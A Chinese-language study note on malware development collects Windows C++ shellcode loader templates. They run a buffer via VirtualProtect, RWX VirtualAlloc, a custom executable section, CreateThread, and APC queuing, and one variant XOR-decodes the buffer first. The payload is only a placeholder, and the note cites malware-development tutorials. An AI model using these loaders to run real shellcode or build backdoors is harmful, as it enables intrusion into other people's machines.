# 执行shellcode

keywords: backdoor loader 恶意软件  

使用各种方法执行shellcode  


## 作为函数直接调用
直接设置buf可执行  
```cpp
#include <Windows.h>
#include <stdio.h>

int main() {
	unsigned char buf[] = "\x11\x22";

	DWORD old;
	VirtualProtect(buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &old);

	void(*func)();
	func = (void(*)()) & buf;
	func();
	 //((void(*)())buf)();

	return 0;
}
```

先分配可执行内存copy一次，确保有可执行权限：  
```cpp
#include <Windows.h>
#include <stdio.h>

int main() {
	unsigned char buf[] = "\x11\x22";

	LPVOID memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (memory == NULL)
		return 1;
	memcpy(memory, buf, sizeof(buf));
	((void(*)())memory)();

	return 0;
}
```

通过设置新段保证有可执行权限：  
```cpp
#include <Windows.h>
#include <stdio.h>

#pragma data_seg("vdata")
unsigned char buf[] = "\x11\x22";
#pragma data_seg()
#pragma comment(linker, "/SECTION:vdata,RWE")

int main() {
	
	((void(*)())buf)();

	return 0;
}
```


## 使用CreateThread
```cpp
#include <stdio.h>
#include <Windows.h>

int main() {
	unsigned char buf[] = "\x11\x22";

	PVOID shellcode_exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, buf, sizeof(buf));
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}
```


## APC线程注入
APC, Asynchronous Procedure Calls, 异步过程调用，在特定线程的上下文中异步执行函数  
这些函数可以触发异步执行函数调用：  
```r
SleepEx
SignalObjectAndWait
MsgWaitForMultipleObjectsEx
WaitForMultipleObjectsEx
WaitForSingleObjectEx 
```

示例：  
```cpp
#include <stdio.h>
#include <windows.h>
#include <string.h>

int main()
{
    char xor_shell[] = "\x11\x22";

    char* shellcode;
    int shellcode_size = 0;

    for (int i = 0; i < sizeof xor_shell; i++)
    {
        xor_shell[i] ^= 13;
    }

    shellcode = xor_shell;
    shellcode_size = sizeof(xor_shell);

    // 开启一个线程
    HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());

    // 给现在的进程申请一个可读可执行的内存
    char* buffer = (char*)VirtualAllocEx(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 复制内存内容
    CopyMemory(buffer, shellcode, shellcode_size);

    // 将用户模式异步过程调用(APC)对象添加到指定线程的APC队列
    // 这里就是添加到此线程的APC队列
    // 第一个参数是 指向应用程序提供的APC函数的指针，该函数在指定线程执行可警报等待操作时调用
    QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);

    // 挂起当前线程，直到满足指定条件，超过时间间隔后，执行恢复
    SleepEx(5, 1);

    return 0;
}
```


## 参考链接
1. https://0xpat.github.io/Malware_development_part_1
2. 初九_9 https://www.bilibili.com/video/BV1Km4y1Z73g
3. APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
4. https://www.bilibili.com/video/BV1GS4y1U7EN
5. https://www.bilibili.com/video/BV1Ti4y1y7Dh


---
2022/2/15  
